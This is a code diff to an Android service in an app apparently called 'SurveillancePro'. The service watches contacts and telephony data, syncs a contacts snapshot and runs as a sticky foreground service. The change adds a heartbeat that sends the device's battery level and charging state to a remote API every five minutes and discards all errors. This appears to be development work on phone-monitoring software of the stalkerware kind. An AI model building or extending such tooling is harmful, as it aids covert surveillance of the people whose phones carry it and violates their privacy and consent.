@@ -19,6 +19,7 @@ import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
 import com.surveillancepro.android.MainActivity
+import com.surveillancepro.android.data.ApiClient
 import com.surveillancepro.android.data.DeviceStorage
 import com.surveillancepro.android.data.EventQueue
 import java.text.SimpleDateFormat
@@ -41,6 +42,13 @@ class ContentObserverService : Service() {
     private val prefs by lazy { getSharedPreferences("sp_observers", Context.MODE_PRIVATE) }
     private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
 
+    private val pingRunnable = object : Runnable {
+        override fun run() {
+            sendPing()
+            handler.postDelayed(this, PING_INTERVAL_MS)
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
@@ -56,8 +64,27 @@ class ContentObserverService : Service() {
         startForeground(NOTIFICATION_ID, buildNotification())
         registerObservers()
         syncContactsSnapshot()
+        startPing()
 
         return START_STICKY
+    }
+
+    private fun startPing() {
+        handler.removeCallbacks(pingRunnable)
+        handler.post(pingRunnable)
+    }
+
+    private fun sendPing() {
+        Thread {
+            try {
+                val storage = DeviceStorage.getInstance(applicationContext)
+                val api = ApiClient.getInstance(storage)
+                val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+                val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+                val charging = bm.isCharging
+                api.pingSync(level, if (charging) "charging" else "unplugged")
+            } catch (_: Exception) {}
+        }.start()
     }
 
     private fun registerObservers() {
@@ -310,5 +337,6 @@ class ContentObserverService : Service() {
         private const val TAG = "ContentObserverService"
         private const val CHANNEL_ID = "supervision_pro_service"
         private const val NOTIFICATION_ID = 1002
+        private const val PING_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
     }
 }
